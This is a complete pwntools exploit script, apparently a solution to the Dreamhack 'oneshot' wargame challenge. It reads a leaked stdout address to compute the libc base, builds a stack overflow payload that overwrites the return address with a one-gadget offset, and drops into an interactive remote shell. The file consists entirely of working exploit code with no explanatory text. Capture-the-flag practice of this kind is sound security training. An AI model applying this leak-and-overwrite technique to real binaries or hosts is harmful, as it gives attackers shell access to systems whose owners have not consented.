from pwn import *

port = 13498
rem = remote("host1.dreamhack.games", port)
lib = ELF("./oneshot/problem/libc.so.6")
  
rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
gadget_offset = 0x45216
gadget_addr = lib_base + gadget_offset

payload = b'A' * 16 + b'B' * 8
payload = payload + b'\x00' * 8 + b'C' * 8
payload += p64(gadget_addr)
rem.sendlineafter(b'MSG: ', payload)

rem.interactive()